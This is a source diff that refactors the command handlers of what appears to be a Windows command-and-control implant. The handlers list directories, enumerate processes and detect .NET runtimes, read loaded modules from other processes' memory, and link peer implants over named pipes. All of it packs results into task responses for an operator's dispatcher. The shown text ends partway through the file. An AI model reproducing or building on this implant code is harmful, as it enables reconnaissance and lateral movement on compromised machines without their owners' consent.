@@ -1,7 +1,12 @@
 #include <core/include/commands.hpp>
+using namespace Peers;
+using namespace Parser;
+using namespace Stream;
+using namespace Dispatcher;
+
 namespace Commands {
 
-    __section(".rdata") _command_map cmd_map[] = {
+    RDATA HASH_MAP cmd_map[] = {
         { .name = DIRECTORYLIST, 	.address = DirectoryList  },
         { .name = PROCESSMODULES,	.address = ProcessModules },
         { .name = PROCESSLIST,		.address = ProcessList    },
@@ -13,20 +18,20 @@ namespace Commands {
 
     VOID DirectoryList (_parser *const parser) {
 
-        _stream *out = Stream::CreateTaskResponse(DIRECTORYLIST);
+        _stream *out = CreateTaskResponse(DIRECTORYLIST);
 
-        ULONG length    = { };
-        LPSTR query     = { };
-        LPSTR path      = { };
+        ULONG length    = 0;
+        LPSTR query     = nullptr;
+        LPSTR path      = nullptr;
+        HANDLE handle   = nullptr;
 
-        HANDLE file                 = { };
         WIN32_FIND_DATAA head       = { };
-        ULARGE_INTEGER file_size    = { };
+        ULARGE_INTEGER handle_size  = { };
         SYSTEMTIME access_time      = { };
         SYSTEMTIME sys_time         = { };
 
-        query   = Parser::UnpackString(parser, nullptr);
-        path    = (char*) x_malloc(MAX_PATH);
+        query   = UnpackString(parser, nullptr);
+        path    = (char*) Malloc(MAX_PATH);
 
         if (query[0] == PERIOD) {
             x_assert(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path));
@@ -39,66 +44,70 @@ namespace Commands {
             path[length]    = NULTERM;
         }
         else {
-            x_memcpy(path, query, MAX_PATH);
+            MemCopy(path, query, MAX_PATH);
         }
 
-        if ((file = Ctx->win32.FindFirstFileA(path, &head))) {
+        if ((handle = Ctx->win32.FindFirstFileA(path, &head))) {
             do {
                 x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
                 x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));
 
                 if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                    Stream::PackDword(out, TRUE);
+                    PackUint32(out, TRUE);
                 }
                 else {
-                    file_size.HighPart   = head.nFileSizeHigh;
-                    file_size.LowPart    = head.nFileSizeLow;
+                    handle_size.HighPart   = head.nFileSizeHigh;
+                    handle_size.LowPart    = head.nFileSizeLow;
 
-                    Stream::PackDword(out, FALSE);
-                    Stream::PackDword64(out, file_size.QuadPart);
+                    PackUint32(out, FALSE);
+                    PackUint64(out, handle_size.QuadPart);
                 }
 
-                Stream::PackDword(out, access_time.wMonth);
-                Stream::PackDword(out, access_time.wDay);
-                Stream::PackDword(out, access_time.wYear);
-                Stream::PackDword(out, sys_time.wHour);
-                Stream::PackDword(out, sys_time.wMinute);
-                Stream::PackDword(out, sys_time.wSecond);
-                Stream::PackString(out, head.cFileName);
+                PackUint32(out, access_time.wMonth);
+                PackUint32(out, access_time.wDay);
+                PackUint32(out, access_time.wYear);
+                PackUint32(out, sys_time.wHour);
+                PackUint32(out, sys_time.wMinute);
+                PackUint32(out, sys_time.wSecond);
+                PackString(out, head.cFileName);
             }
-            while (Ctx->win32.FindNextFileA(file, &head) != 0);
+            while (Ctx->win32.FindNextFileA(handle, &head) != 0);
         }
         else {
             goto defer;
         }
 
-        Dispatcher::MessageQueue(out);
+        MessageQueue(out);
 
         defer:
-        if (file) { Ctx->win32.FindClose(file); }
-        if (path) { x_free(path); }
+        if (handle) {
+            Ctx->win32.FindClose(handle);
+        }
+        if (path) {
+            Free(path);
+        }
     }
 
     VOID ProcessModules (_parser *const parser) {
 
-        _stream *out = Stream::CreateTaskResponse(PROCESSMODULES);
+        _stream *out = CreateTaskResponse(PROCESSMODULES);
 
-        PPEB_LDR_DATA loads             = { };
+        LDR_DATA_TABLE_ENTRY module     = { };
         PROCESS_BASIC_INFORMATION pbi   = { };
-        HANDLE process                  = { };
-        ULONG pid                       = { };
 
-        LDR_DATA_TABLE_ENTRY module = { };
-        PLIST_ENTRY head 	        = { };
-        PLIST_ENTRY entry           = { };
+        PPEB_LDR_DATA loads         = nullptr;
+        PLIST_ENTRY head 	        = nullptr;
+        PLIST_ENTRY entry           = nullptr;
+        HANDLE process              = nullptr;
 
-        CHAR modname_a[MAX_PATH]    = { };
-        WCHAR modname_w[MAX_PATH]   = { };
+        char modname_a[MAX_PATH]    = { };
+        wchar_t modname_w[MAX_PATH] = { };
 
-        INT count   = 0;
-        SIZE_T size = 0;
+        uint32_t pid    = 0;
+        uint32_t count  = 0;
+        size_t size     = 0;
 
-        x_assert(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr)));
+        x_assert(pid = Process::GetProcessIdByName(UnpackString(parser, nullptr)));
         x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
         x_ntassert(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
@@ -112,24 +121,24 @@ namespace Commands {
             x_assert(size == module.FullDllName.Length);
 
             if (module.FullDllName.Length > 0) {
-                size = x_wcstombs(modname_a, modname_w, module.FullDllName.Length);
+                size = WcsToMbs(modname_a, modname_w, module.FullDllName.Length);
 
-                Stream::PackString(out, modname_a);
-                Stream::PackDword64(out, (UINT64)module.DllBase);
+                PackString(out, modname_a);
+                PackPointer(out, module.DllBase);
                 count++;
             }
 
-            x_memset(modname_w, 0, MAX_PATH);
-            x_memset(modname_a, 0, MAX_PATH);
+            MemSet(modname_w, 0, MAX_PATH);
+            MemSet(modname_a, 0, MAX_PATH);
         }
 
-        Dispatcher::MessageQueue(out);
+        MessageQueue(out);
         defer:
     }
 
     VOID ProcessList(_parser *const parser) {
 
-        _stream *out = Stream::CreateTaskResponse(PROCESSLIST);
+        _stream *out = CreateTaskResponse(PROCESSLIST);
 
         PROCESSENTRY32 entries      = { };
         HANDLE snapshot             = { };
@@ -140,10 +149,7 @@ namespace Commands {
         ICLRRuntimeInfo *runtime    = { };
 
         WCHAR buffer[1024];
-
-        DWORD size  = 0;
-        DWORD type  = Parser::UnpackDword(parser);
-
+        DWORD size = 0;
 
         size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
@@ -152,14 +158,14 @@ namespace Commands {
         x_assert(Ctx->win32.Process32First(snapshot, &entries));
 
         do {
-            BOOL is_managed  = false;
-            BOOL is_loaded   = false;
-
-            CLIENT_ID           cid     = { };
-            OBJECT_ATTRIBUTES   attr    = { };
+            CLIENT_ID cid = { };
+            OBJECT_ATTRIBUTES attr = { };
 
             cid.UniqueThread    = nullptr;
             cid.UniqueProcess   = (void*) entries.th32ProcessID;
+
+            BOOL is_managed  = false;
+            BOOL is_loaded   = false;
 
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
 
@@ -169,47 +175,60 @@ namespace Commands {
 
             while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
                 if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {
-                    is_managed = TRUE;
 
-                    if (type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
-                        Stream::PackDword(out, entries.th32ProcessID);
-                        Stream::PackString(out, entries.szExeFile);
-                        Stream::PackWString(out, buffer);
+                    is_managed = true;
+                    if (SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
+                        PackUint32(out, entries.th32ProcessID);
+                        PackString(out, entries.szExeFile);
+                        PackWString(out, buffer);
+                        PackByte(out, 1);
                     }
                 }
                 runtime->lpVtbl->Release(runtime);
             }
 
-            if (!is_managed && type == UNMANAGED_PROCESS) {
-                Stream::PackDword(out, entries.th32ProcessID);
-                Stream::PackString(out, entries.szExeFile);
+            if (!is_managed) {
+                PackUint32(out, entries.th32ProcessID);
+                PackString(out, entries.szExeFile);
+                PackWString(out, nullptr);
+                PackByte(out, 0);
             }
 
-            if (meta)       { meta->lpVtbl->Release(meta); }
-            if (runtime)    { runtime->lpVtbl->Release(runtime); }
-            if (enums)      { enums->Release(); }
-
-            Ctx->nt.NtClose(process);
+            if (process) {
+                Ctx->nt.NtClose(process);
+            }
+            if (meta) {
+                meta->lpVtbl->Release(meta);
+            }
+            if (runtime) {
+                runtime->lpVtbl->Release(runtime);
+            }
+            if (enums) {
+                enums->Release();
+            }
         }
         while (Ctx->win32.Process32Next(snapshot, &entries));
-        Dispatcher::MessageQueue(out);
+
+        MessageQueue(out);
 
         defer:
-        if (snapshot) { Ctx->nt.NtClose(snapshot); }
+        if (snapshot) {
+            Ctx->nt.NtClose(snapshot);
+        }
     }
 
-    VOID AddPeer(_parser *parser) {
+    VOID CommandAddPeer(_parser *parser) {
 
-        auto pipe_name  = Parser::UnpackWString(parser, nullptr);
-        auto peer_id    = Parser::UnpackDword(parser);
+        auto pipe_name  = UnpackWString(parser, nullptr);
+        auto peer_id    = UnpackDword(parser);
 
-        Clients::AddClient(pipe_name, peer_id);
+        AddPeer(pipe_name, peer_id);
     }
 
-    VOID RemovePeer(_parser *parser) {
+    VOID CommandRemovePeer(_parser *parser) {
 
-        auto peer_id = Parser::UnpackDword(parser);
-        Clients::RemoveClient(peer_id);
+        auto peer_id = UnpackDword(parser);
+        RemovePeer(peer_id);
     }
 
     VOID Shutdown (_parser *parser) {
